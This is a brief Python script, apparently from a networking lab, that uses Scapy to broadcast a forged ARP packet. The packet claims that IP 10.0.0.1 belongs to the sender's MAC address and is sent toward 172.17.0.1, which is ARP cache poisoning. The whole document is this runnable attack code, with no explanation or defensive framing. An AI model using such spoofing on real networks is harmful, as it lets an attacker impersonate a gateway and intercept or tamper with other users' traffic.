from scapy.all import *

SELF_MAC = 'ca:ae:9c:9e:f9:79'
BCAST_MAC = 'ff:ff:ff:ff:ff:ff'

packet = Ether(dst = BCAST_MAC, src = SELF_MAC, type = 0x0806)/ARP(psrc = "10.0.0.1", hwsrc = SELF_MAC, pdst = "172.17.0.1")
sendp(packet, iface="src-eth0")